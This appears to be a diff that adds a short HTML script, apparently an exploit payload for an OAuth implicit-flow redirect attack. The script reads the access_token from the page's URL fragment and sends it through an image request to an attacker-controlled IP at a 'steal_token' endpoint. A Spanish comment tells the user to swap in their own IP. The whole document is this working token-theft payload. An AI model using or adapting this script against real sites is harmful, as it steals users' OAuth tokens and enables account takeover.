@@ -1,0 +1,12 @@
+<script>
+  var hash = window.location.hash.substr(1);
+  var result = hash.split('&').reduce(function (res, item) {
+    var parts = item.split('=');
+    res[parts[0]] = parts[1];
+    return res;
+  }, {});
+  var accessToken = result.access_token;
+  var img = new Image();
+  // ¡CAMBIA LA IP DE ABAJO POR LA TUYA!
+  img.src = 'http://10.81.139.131:8081/steal_token?token=' + accessToken;
+</script>
